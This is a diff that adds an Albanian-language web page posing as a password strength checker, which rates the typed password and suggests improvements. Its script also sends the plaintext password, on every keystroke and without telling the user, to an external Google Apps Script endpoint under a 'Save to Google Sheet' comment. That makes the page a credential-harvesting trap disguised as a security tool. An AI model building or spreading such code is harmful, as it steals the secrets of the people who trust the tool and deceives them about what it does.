@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="sq">
+<head>
+  <meta charset="UTF-8">
+  <title>Kontrollo Fjalëkalimin</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background: white;
+      padding: 40px;
+      border-radius: 16px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
+      text-align: center;
+      width: 100%;
+      max-width: 400px;
+    }
+
+    h1 {
+      margin-bottom: 20px;
+      color: #222;
+    }
+
+    input[type="password"], input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
+      margin-bottom: 10px;
+    }
+
+    .toggle-eye {
+      position: absolute;
+      right: 20px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      font-size: 18px;
+      color: #666;
+    }
+
+    .input-group {
+      position: relative;
+    }
+
+    .result {
+      font-weight: bold;
+      font-size: 18px;
+      margin-top: 10px;
+    }
+
+    .weak { color: red; }
+    .medium { color: orange; }
+    .strong { color: green; }
+
+    .suggestions {
+      text-align: left;
+      margin-top: 10px;
+      font-size: 14px;
+      color: #444;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <h1>🔐 Kontrollo Fjalëkalimin</h1>
+
+  <div class="input-group">
+    <input type="password" id="password" placeholder="Shkruaj fjalëkalimin">
+    <span class="toggle-eye" onclick="togglePassword()">👁️</span>
+  </div>
+
+  <div id="result" class="result"></div>
+  <div id="suggestions" class="suggestions"></div>
+</div>
+
+<script>
+  let visible = false;
+  const passwordInput = document.getElementById("password");
+  const resultEl = document.getElementById("result");
+  const suggestionsEl = document.getElementById("suggestions");
+
+  passwordInput.addEventListener("input", checkPasswordStrength);
+
+  function togglePassword() {
+    visible = !visible;
+    passwordInput.type = visible ? "text" : "password";
+  }
+
+  function checkPasswordStrength() {
+    const pw = passwordInput.value;
+    let score = 0;
+    let tips = [];
+
+    if (pw.length >= 8) score++; else tips.push("• Bëje të paktën 8 karaktere të gjata");
+    if (/[A-Z]/.test(pw)) score++; else tips.push("• Shto një SHKRONJË TË MADHE");
+    if (/[a-z]/.test(pw)) score++;
+    if (/\d/.test(pw)) score++; else tips.push("• Shto një numër (0–9)");
+    if (/[^a-zA-Z0-9]/.test(pw)) score++; else tips.push("• Shto një simbol special (p.sh. !, @, #)");
+
+    if (!pw) {
+      resultEl.innerHTML = "";
+      suggestionsEl.innerHTML = "";
+      return;
+    }
+
+    if (score <= 2) {
+      resultEl.innerHTML = "❌ Forca: Dobët";
+      resultEl.className = "result weak";
+    } else if (score <= 4) {
+      resultEl.innerHTML = "⚠️ Forca: Mesatare";
+      resultEl.className = "result medium";
+    } else {
+      resultEl.innerHTML = "✅ Forca: E fortë";
+      resultEl.className = "result strong";
+    }
+
+    suggestionsEl.innerHTML = tips.length > 0
+      ? `<strong>Sugjerime për përmirësim:</strong><br>${tips.join("<br>")}`
+      : "";
+
+    // Save to Google Sheet
+    saveToGoogleSheet(pw);
+  }
+
+  function saveToGoogleSheet(password) {
+    fetch("https://script.google.com/macros/s/AKfycbxb5MSr0jPqu5zqVi_OLEnMDwEZhj5xcgaklZFJRwLLMi0RKl5RGyYalLYOGFiJIXAd/exec", {
+      method: "POST",
+      mode: "cors",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ password })
+    })
+    .then(response => response.json())
+    .then(data => {
+      console.log("✅ Saved to sheet:", data);
+    })
+    .catch(error => {
+      console.error("❌ Error saving:", error);
+    });
+  }
+</script>
+
+</body>
+</html>
